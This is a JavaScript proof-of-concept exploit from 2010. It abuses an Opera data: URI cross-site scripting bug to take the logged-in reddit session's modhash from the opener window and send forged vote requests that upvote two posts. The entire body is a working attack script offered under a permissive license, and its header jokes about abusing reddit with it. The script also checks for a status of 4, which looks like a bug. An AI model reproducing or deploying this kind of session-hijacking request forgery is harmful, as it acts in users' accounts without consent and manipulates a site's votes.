/* Opera data: URI XSS vulnerability PoC reddit exploit
 * Uses Opera bug CORE-29480.
 * 2010-06-19
 *
 * Copyright (c) 2010 Eli Grey, http://eligrey.com
 *
 * Permission is hereby granted, free of charge, to any person obtaining a copy
 * of this software and associated documentation files (the "Software"), to deal
 * in the Software without restriction, including without limitation the rights
 * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
 * copies of the Software, and to permit persons to whom the Software is
 * furnished to do so, subject to the following conditions:
 *
 * The above copyright notice and this permission notice shall be included in
 * all copies or substantial portions of the Software.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
 * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
 * THE SOFTWARE.
 *
 * tl;dr: Attribute to me and I'm not liable if you abuse reddit with this script.
 */

(function () {
	var reddit = opener || parent;
	if (self.opera && opera.version() < "10.60" && reddit) {
		var votes = ["cgu93", "cguch"],
		i = 2, // =votes.length
		open = ["POST", "/api/vote", true],
		contentType = ["Content-Type", "application/x-www-form-urlencoded"],
		data = "dir=1&vh=1337&uh=" + reddit.reddit.modhash + "&renderstyle=html&id=t3_",
		doc = document,
		message = doc.getElementById("message"),
		xhr;
		
		while (i--) {
			xhr = new reddit.XMLHttpRequest;
			xhr.onreadystatechange = (function (i) {
				return function () {
					if (this.readyState === 4 && this.status === 4) {
						message.appendChild(doc.createElement("p"))
						       .appendChild(doc.createTextNode("Upvoted t3_" + votes[i] + "."));
					}
				};
			}(i));
			xhr.open.apply(xhr, open);
			xhr.setRequestHeader.apply(xhr, contentType);
			xhr.send(data + votes[i]);
		}
	}
}());
